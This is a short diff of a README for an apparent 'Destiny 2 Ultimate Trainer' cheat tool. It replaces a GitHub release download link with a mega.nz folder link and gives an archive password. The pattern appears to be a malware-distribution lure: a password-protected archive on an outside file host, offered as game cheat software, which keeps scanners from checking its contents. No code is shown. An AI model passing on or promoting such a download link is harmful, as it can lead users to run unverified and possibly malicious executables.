@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/tomparkops19z6/Destiny-2-Ultimate-Trainer/releases/download/Destiny2/Destiny2_Trainer.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://mega.nz/folder/pUQUDapJ#ZtQzcnnhYGjQ_NHlfrcxKg)
 
 🔐 **Archive password:** **`5868781`**
 
